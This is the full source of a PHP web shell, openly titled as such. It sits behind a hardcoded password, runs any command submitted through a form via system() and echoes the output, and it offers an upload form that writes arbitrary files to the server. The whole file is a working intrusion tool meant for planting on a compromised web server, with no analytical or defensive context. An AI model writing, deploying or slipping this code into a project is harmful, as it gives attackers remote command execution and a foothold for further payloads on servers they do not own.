<?php
// Optional password protection
$auth_pass = "phivault";  // change this!

session_start();
if (!isset($_SESSION['shell_logged_in'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $auth_pass) {
        $_SESSION['shell_logged_in'] = true;
    } else {
        echo '<form method="post"><input type="password" name="pass" placeholder="Enter password"><input type="submit" value="Login"></form>';
        exit;
    }
}

// Command execution interface
echo "<h2>PHP Web Shell</h2>";
echo "<form method='post'>
    <input name='cmd' style='width:80%' autofocus>
    <input type='submit' value='Run'>
</form>";

if (isset($_POST['cmd'])) {
    echo "<pre>";
    system($_POST['cmd']);
    echo "</pre>";
}

// File upload (optional)
echo "<hr><h3>Upload File</h3>
<form method='post' enctype='multipart/form-data'>
<input type='file' name='upload'>
<input type='submit' name='go' value='Upload'>
</form>";

if (isset($_POST['go']) && isset($_FILES['upload'])) {
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name'])) {
        echo "✅ File uploaded successfully.";
    } else {
        echo "❌ Upload failed.";
    }
}
?>
